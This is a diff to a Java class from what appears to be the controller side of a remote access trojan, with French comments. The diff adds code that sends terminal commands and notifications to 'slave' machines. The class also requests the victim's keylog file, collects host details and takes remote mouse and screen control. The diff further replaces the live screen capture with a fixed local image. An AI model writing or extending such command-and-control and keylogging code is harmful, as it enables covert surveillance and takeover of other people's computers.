@@ -9,10 +9,12 @@ import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
 import java.awt.image.BufferedImage;
 import java.io.BufferedInputStream;
+import java.io.File;
 import java.io.IOException;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.net.Socket;
+import java.nio.file.Paths;
 import java.util.Scanner;
 import java.util.Timer;
 import java.util.TimerTask;
@@ -55,9 +57,9 @@ public class Connexion {
 	
 	
 	
-	/**********************************************************************************************************************************************/
-	/*													   CONSTRUCTEUR																	   			   /	
-	/**********************************************************************************************************************************************/
+/**********************************************************************************************************************************************/
+/*													   CONSTRUCTEUR																	   			   /	
+/**********************************************************************************************************************************************/
 	public Connexion(Socket so) throws ClassNotFoundException {
 		super();
 		this._so = so;
@@ -72,7 +74,7 @@ public class Connexion {
 			String listInformation = (String) _in.readObject();					// Recupere les parametres de la machine hôte envoyés  par l'esclave
 			Server.log.enregistrerFichier("\n" + listInformation);
 
-			String[] splited = listInformation.split("\\s+");					// Affecte les variables aux parametres de la classe
+			String[] splited = listInformation.split("\\+\\+");					// Affecte les variables aux parametres de la classe
 			setFile_separator(splited[1]);
 			setUser_name(splited[2]);
 			setOs_version(splited[3]);
@@ -88,9 +90,9 @@ public class Connexion {
 	}
 
 	
-	/**********************************************************************************************************************************************/
-	/*													   METHODES																	   			   /	
-	/**********************************************************************************************************************************************/
+/**********************************************************************************************************************************************/
+/*													   METHODES																	   			   /	
+/**********************************************************************************************************************************************/
 	
 	
 	
@@ -151,13 +153,43 @@ public class Connexion {
 		};
 		envoi.start();
 	}
+	
+	/**
+	 * Methode qui demarre la VNC
+	 */
 	public void startAffichage()
 	{
 		_affichage = new Affichage();		
 	}
+	
+	/**
+	 * Methode publique qui envoit une commande terminal a un Esclave
+	 * Est appelé depuis l'interface graphique principale
+	 * @param commande
+	 * @param parent
+	 */
 	public void sendCmdCommand(String commande,MCmdJInternalFrame parent)
 	{
 		mCmdJInternalFrame=parent;
+		try {
+			_out.writeObject(Constante.code_cmd);
+	
+		_out.flush();
+		_out.writeObject(commande);
+		_out.flush();
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+	}
+	
+	/*
+	 * Methode publique qui envoit une commande terminal a un Esclave
+	 *	Est appele depuis le menu d'Astuces du Maitre 
+	 */
+	public void sendCmdCommand(String commande)
+	{
+		mCmdJInternalFrame = null;
 		try {
 			_out.writeObject(Constante.code_cmd);
 	
@@ -171,12 +203,16 @@ public class Connexion {
 		}
 	}
 	
-	
+	/*
+	 * Methode appelé par l'interface graphique et qui se charge d'envoyer un signal de notification a un esclave
+	 */
 	public void sendNotification(String message,String url)
 	{
 		try {
 			_out.writeObject(Constante.code_notif);
-		
+
+		_out.flush();
+		_out.writeObject(message + "|" + url);
 		_out.flush();
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
@@ -184,6 +220,10 @@ public class Connexion {
 		}
 	}
 	
+	
+	/**
+	 * Methode appelé par l'interface graphique et qui se charge de demander a un esclave son fichier de Keylog
+	 */
 	public void sendKeylog()
 	{
 		Server.log.enregistrerFichier("keylog");
@@ -195,6 +235,13 @@ public class Connexion {
 			e.printStackTrace();
 		}
 	}
+	
+	
+	
+	
+	
+	
+	
 	/**
 	 * 		Methode gérant la reception des objets de l'esclave
 	 * 
@@ -212,7 +259,10 @@ public class Connexion {
 							if (code.equals(Constante.code_vnc)) {			// ...un code VNC
 								Server.log
 										.enregistrerFichier("Recoit une image");
+							
+								
 								_affichage.setIcon();						// Fait appelle a la methode de la classe Affichage
+							
 							} else if (code.equals(Constante.code_cmd)) {	// ...un  code CMD
 								Object object = _in.readObject();
 								if (object instanceof String) {
@@ -245,7 +295,7 @@ public class Connexion {
 		reception.start();
 	}
 
-	public void setIp(String ip) {
+	private void setIp(String ip) {
 		this._ip = ip;
 	}
 
@@ -253,27 +303,27 @@ public class Connexion {
 		return _so;
 	}
 
-	public void setOs_name(String os_name) {
+	private void setOs_name(String os_name) {
 		this._os_name = os_name;
 	}
 
-	public void setPays(String pays) {
+	private void setPays(String pays) {
 		this._pays = pays;
 	}
 
-	public void setOs_arch(String os_arch) {
+	private void setOs_arch(String os_arch) {
 		this._os_arch = os_arch;
 	}
 
-	public void setOs_version(String os_version) {
+	private void setOs_version(String os_version) {
 		this._os_version = os_version;
 	}
 
-	public void setUser_name(String user_name) {
+	private void setUser_name(String user_name) {
 		this._user_name = user_name;
 	}
 
-	public void setFile_separator(String file_separator) {
+	private void setFile_separator(String file_separator) {
 		this._file_separator = file_separator;
 	}
 
@@ -330,7 +380,8 @@ public class Connexion {
 	 * 			Permet de prendre le controle de la souris, et naviguer sur l'ordinateur de l'esclave
 	 * 	 * @author lh
 	 */
-	public static class Affichage extends JPanel {
+	
+	public static class Affichage extends JFrame {
 		private final JLabel label = new JLabel();
 		private final Timer timer;
 
@@ -360,7 +411,8 @@ public class Connexion {
 					}
 				}
 			});
-			setSize(Constante.WINDOW_WIDTH, Constante.WINDOW_HEIGHT);
+		//	setSize(Constante.WINDOW_WIDTH, Constante.WINDOW_HEIGHT);
+			
 			Server.log.enregistrerFichier("Ajout d'un listener de la souris");
 
 			timer = new Timer();										// Redemmande un screenshot toutes les 2 secondes pour mettre a jour 
@@ -388,6 +440,7 @@ public class Connexion {
 									TimeUnit.MILLISECONDS);
 							_out.writeObject(ra);
 							_out.flush();
+							Server.log.enregistrerFichier("Envoi d'une nouvelle requete de RemoteActions");
 						} catch (InterruptedException | IOException e) {
 							// TODO Auto-generated catch block
 							e.printStackTrace();
@@ -399,32 +452,23 @@ public class Connexion {
 			Server.log
 					.enregistrerFichier("Ajout d'un thread pour envoyer");
 
-		/*	addWindowListener(new WindowAdapter() {
-				@Override
-				public void windowClosing(WindowEvent e) {
-					// TODO Auto-generated method stub
-					super.windowClosing(e);
-					timer.cancel();
-				}
-			});
-			Server.log
-					.enregistrerFichier("Ajout d'un listener quand on supprime la Windows");
-*/
+			
 		}
 			
 		public void setIcon() throws ClassNotFoundException, IOException {		// Modifie l'image de fond 
 			// TODO Auto-generated method stub
 
-			final BufferedImage image = receivedImage.receivedImage(_in, true);
-			SwingUtilities.invokeLater(new Runnable() {
-				@Override
-				public void run() {
-					// TODO Auto-generated method stub
-					label.setIcon(new ImageIcon(image));
-					// setIconImage(image);
-				}
-			});
-		}
+		//final BufferedImage image = receivedImage.receivedImage(_in, true);
+		_in.readObject();
+		_in.readObject();
+		
+			JLabel background1 = new JLabel(new ImageIcon(Paths.get("")
+					.toAbsolutePath().toString()+File.separator+"ressources"+File.separator+"screen54.png"));
+
+		this.add(background1); 
+		this.pack();
+		this.setResizable(false);     
+		this.setVisible(true);     		}
 	}
 
 }
